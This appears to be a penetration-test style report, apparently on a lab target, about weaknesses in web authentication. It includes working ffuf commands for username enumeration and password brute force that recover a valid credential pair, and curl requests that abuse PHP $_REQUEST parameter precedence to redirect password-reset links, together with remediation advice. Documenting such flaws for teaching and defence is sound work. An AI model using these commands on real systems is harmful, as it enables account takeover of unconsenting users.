#  Executive Summary: Web Authentication & Session Security Audit

## Overview
In today’s cybersecurity landscape, the **Authentication System** and **Session Lifecycle** represent the primary entry point for web applications. A failure in authentication controls directly exposes user accounts, administrative interfaces, and sensitive corporate data to unauthorized access.

This specialized security audit was conducted to evaluate the robustness of the authentication mechanisms, session management protocols, and brute-force defenses against real-world attack vectors, following the **OWASP Application Security Verification Standard (ASVS)** and **PTES methodology**.

---

##  What This Audit Delivers (Scope & Value)

By performing this audit, we provide a complete evaluation covering the core security pillars of your login infrastructure:

1. **Input Validation & Injection Resistance:** 
   Testing login interfaces against modern data injection vectors, including **SQL Injection (SQLi)** and **NoSQL Injection**, ensuring malicious input cannot bypass credentials verification.

2. **Brute-Force & Rate-Limiting Verification:** 
   Simulating automated credential-stuffing and password-guessing attacks to verify if active throttling, IP lockouts, or rate-limiting mechanisms effectively safeguard user accounts.

3. **Session Cookie & Token Security:** 
   Deep-checking session token attributes (`HttpOnly`, `Secure`, `SameSite`) and token randomness to eliminate risks of Session Hijacking, Cross-Site Scripting (XSS) cookie theft, and Cross-Site Request Forgery (CSRF).

4. **Password Reset & Account Lifecycle Logic:** 
   Auditing password recovery workflows to prevent logic flaws, host-header injections, and unauthorized token manipulation that could lead to account takeovers.

5. **Transport Layer & Cache Hardening:** 
   Verifying HTTPS enforcement, HSTS implementation, and sensitive page cache policies (`Cache-Control: no-store`) to protect user credentials during transit and local browser storage.

---

##  Business Impact & Deliverables

Upon completion of this audit, the application owner receives:
* **Actionable Proof-of-Concept (PoC):** Step-by-step evidence for any identified vulnerability with technical zero-day impact analysis.
* **Remediation & Hardening Roadmap:** Precise, code-level recommendations to patch security gaps and align the system with industry standards.
* **Security Verification Statement:** Clear documentation proving that the authentication flow has been thoroughly stress-tested against modern exploitation techniques.

# Vulnerability Finding: Username Enumeration & Unthrottled Brute Force

## 1. Executive Summary
During the audit of the authentication mechanisms, a critical flaw in the registration logic allowed for **Username Enumeration**. By leveraging this flaw, we successfully identified valid usernames registered on the system. Furthermore, the absence of active rate-limiting on the login endpoint enabled a targeted **Password Brute Force attack**, leading to a full account takeover.

## 2. Technical Findings & Proof of Concept (PoC)

### Finding A: Username Enumeration via Registration Response
* **Vulnerability Class:** Information Disclosure / Username Enumeration
* **Severity:** Medium
* **Location:** `http://10.82.185.120/customers/signup`

The registration form leaks the existence of registered accounts through distinct error responses:
* Existing user input triggers: `An account with this username already exists`
* Non-existing user input allows registration progression.

<img width="1222" height="370" alt="name=true" src="https://github.com/user-attachments/assets/4abe5293-343b-4b5e-932a-d1e8e2f946d8" />

<img width="1222" height="370" alt="name=false" src="https://github.com/user-attachments/assets/1ee25352-eb2d-453e-a506-cb4b5b45f5e7" />


#### Automated Enumeration Attack
Using `ffuf`, we automated username discovery against a standard wordlist:

```bash
ffuf -s -w /usr/share/wordlists/seclists/Usernames/Names/names.txt \
-X POST -d "username=FUZZ&email=x&password=x&cpassword=x" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u [http://10.82.185.120/customers/signup](http://10.82.185.120/customers/signup) \
-mr "username already exists" | awk '{print $1}'
```
Discovered Valid Usernames: admin, ossama, robert, simon, steve.

<img width="1066" height="250" alt="names" src="https://github.com/user-attachments/assets/f7f9bc09-3ba9-4364-9aec-41bd7fe87de7" />


Finding B: Credential Stuffing & Unthrottled Brute Force
Vulnerability Class: Lack of Rate Limiting / Password Guessing

Severity: High

Location: http://10.82.185.120/customers/login
After saving the discovered valid usernames into valid_usernames.txt, we performed a targeted dictionary attack on the login endpoint:
```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt:W2 \
-X POST -d "username=W1&password=W2" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u [http://10.82.185.120/customers/login](http://10.82.185.120/customers/login) -fc 200
```
Recovered Credentials: steve:thunder

<img width="1067" height="674" alt="name-pass" src="https://github.com/user-attachments/assets/d636457b-b360-42b5-9d4f-627949e54bdf" />

Authentication Verification
Using the recovered credentials (steve / thunder), we successfully authenticated to the application interface.

<img width="1600" height="581" alt="login=true" src="https://github.com/user-attachments/assets/2cd81fff-d7af-4d5c-89d7-c21e3ab1dff7" />

3. Important Operational & Safety Note
Operational Disclaimer:
During this assessment, high-speed automated testing was executed strictly because the underlying lab environment supports high request concurrency. In a real-world client engagement, request rates (-p / -rate parameters in ffuf) are dynamically throttled to ensure zero service disruption, preventing Denial of Service (DoS) conditions on client infrastructure.

4. Remediation & Hardening Recommendations
Generic Error Messages: Standardize registration and authentication error responses (e.g., "Invalid registration details" or "Invalid username or password").

Implement Rate Limiting: Enforce IP-based and account-based throttling (e.g., 5 failed attempts per minute) on both /signup and /login endpoints.

## Vulnerability Finding : Authentication Bypass via Logic Flaw in Password Reset

1. Executive Summary
During the security assessment of the password reset mechanism on [http://10.82.185.120/customers/reset](http://10.82.185.120/customers/reset), a critical Logic Flaw was identified. The application relies on the vulnerable PHP $_REQUEST superglobal to fetch input parameters during the reset flow. This allows an attacker to manipulate parameter precedence, overriding the target's email with an attacker-controlled address. Consequently, the reset link for any arbitrary account is delivered to the attacker, leading to Full Account Takeover.

2. Vulnerability Details
Vulnerability Class: Business Logic Flaw / Parameter Confusion

Severity: High

Target Endpoint: [http://10.82.185.120/customers/reset](http://10.82.185.120/customers/reset)

Root Cause Analysis:
Application Workflow: The password reset endpoint expects the targeted user's email via a GET query parameter (?email=robert@acmeitsupport.thm) and the username via a POST parameter (username=robert).

The Logic Flaw: In PHP, the $_REQUEST array merges both $_GET and $_POST data. When the same parameter key (email) is present in both the URL and the POST body, PHP prioritizes the POST value. The backend code uses $_REQUEST['email'] to decide where to send the password reset notification.

Exploitation Impact: An attacker can supply the target's email in the URL (GET) to pass user verification, but override it with their own email in the request body (POST). The application then sends the reset/login link for the target account directly to the attacker.

## 3. Proof of Concept & Step-by-Step Exploitation
Step 1: Attacker Account Setup
An attacker registers an account on the customer platform to receive support tickets and system emails:

Username: naser

Email: naser@acmeitsupport.thm

Internal Ticket Email: naser@customer.acmeitsupport.thm

Step 2: Testing Standard Password Reset Logic
A baseline HTTP request is issued via curl to observe standard behavior for target account robert:

```bash
curl 'http://10.82.185.120/customers/reset?email=robert%40acmeitsupport.thm' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d 'username=robert'
```
<img width="1071" height="122" alt="command1" src="https://github.com/user-attachments/assets/a55b8a33-4473-454a-a519-5597444edc1c" />

Step 3: Parameter Overriding & Reset Hijacking
To exploit the logic flaw, an additional email parameter containing the attacker's email address is appended to the POST body:

```bash
curl 'http://10.82.185.120/customers/reset?email=robert%40acmeitsupport.thm' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d 'username=robert&email=naser@customer.acmeitsupport.thm'
```
<img width="1064" height="642" alt="commend2" src="https://github.com/user-attachments/assets/de525fea-acb6-41e3-8e8a-f7b29a08c56e" />

Step 4: Intercepting the Link & Account Takeover
Navigating to the ticket portal of the attacker account (naser) reveals a new incoming ticket containing the password reset login link for user robert.

Image Placement: Insert link.txt here showing the support ticket with the generated reset link.

Opening the reset link grants full unauthorized access to robert@customer.acmeitsupport.thm.

<img width="960" height="498" alt="login" src="https://github.com/user-attachments/assets/f9e3d407-2a37-425c-bd42-2c5b7a5f2389" />

## 4. Remediation Recommendations
Eliminate $_REQUEST Usage: Avoid using $_REQUEST in backend PHP code. Explicitly read URL parameters using $_GET['email'] and POST data using $_POST['username'].

Server-Side Session State: Bind password reset tokens to the verified user identity stored in the database, ignoring user-controlled body parameters for email delivery during execution.
